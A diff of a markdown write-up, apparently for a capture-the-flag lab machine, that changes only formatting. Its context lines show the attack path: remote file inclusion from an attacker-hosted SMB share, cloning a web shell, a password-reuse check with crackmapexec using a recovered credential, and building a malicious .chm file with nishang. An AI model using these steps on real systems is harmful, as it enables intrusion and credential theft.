@@ -54,6 +54,7 @@ But in the PHP configuration file, "**allow_url_include**" wrapper **by-default 
 [https://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html](https://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
 
 - Create a file to test (displays php server info):
+
 ```bash
 echo "<?php phpinfo(); ?>" | tee /tmp/share/test.php
 
@@ -62,6 +63,7 @@ echo "<?php phpinfo(); ?>" | tee /tmp/share/test.php
 - Tried it with impacket-smbserver but we get a connection and it closes
 
 - So following the link above:
+
 ```bash
 sudo su
 apt install samba
@@ -69,7 +71,7 @@ mkdir /tmp/share
 chmod 0555 /tmp/share
 chown -R nobody:nogroup /tmp/share
 cp /etc/samba/smb.conf /etc/samba/smb.conf.bak
-echo \> /etc/samba/smb.conf
+echo > /etc/samba/smb.conf
 nano /etc/samba/smb.conf
 
 ```
@@ -101,6 +103,7 @@ force user = nobody
 ```bash
 service smbd restart
 ```
+
 - Note: The **\[share\]** is the sharename
 So we have to go to **?lang=\\10.10.14.84\share\test.php**
 
@@ -110,6 +113,7 @@ So we have to go to **?lang=\\10.10.14.84\share\test.php**
 It worked!
 
 - Now let's get an interactive web shell:
+
 ```bash
 git clone https://github.com/incredibleindishell/Mannu-Shell.git
 cd Mannu-Shell
@@ -154,7 +158,7 @@ Moving on:
 
 ![image13](../resources/01f20af06aa843e68f07e96bd5336f5c.png)
 
-- We can check if the credentials were reused:
+- We can check if the credentials were reused:  
 ```bash
 crackmapexec smb 10.129.202.21 -u "chris" -p '36mEAhz/B8xQ~2VM'
 
@@ -242,7 +246,7 @@ Following this guide, we can create a malicious .chm file:
 - Download the Out-CHM.ps1 module (or copy and paste):
 <https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1>
 
-- Open PS as admin and run:
+- Open PS as admin and run:  
 ```powershell
 Set-ExecutionPolicy Unrestricted
 Import-Module .\Out-CHM.ps1
